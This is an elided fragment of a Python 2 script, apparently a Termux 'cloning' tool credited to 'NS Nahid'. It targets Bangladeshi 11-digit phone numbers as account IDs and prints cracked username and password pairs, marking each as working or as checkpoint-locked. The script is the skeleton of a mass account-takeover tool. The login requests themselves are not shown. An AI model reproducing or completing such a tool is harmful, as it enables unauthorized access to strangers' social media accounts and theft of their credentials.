...
psb('\x1b[1;32mBANGLADESH NS Nahid  11 DIGIT CLONING START PLEASE WAIT ..........')
...
def menu():
    ...
    print 'AUTHOR   : NS Nahid  ISLAM'

    print 'FACEBOOK : TERMUX TEACHER NS Nahid '

    print 'GITHUB     : github.com/TERMUXNS Nahid '
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[NS Nahid -OKY]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                ...
                print '\x1b[1;93m[NS Nahid -CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 03 Days]\x1b[0m \n'
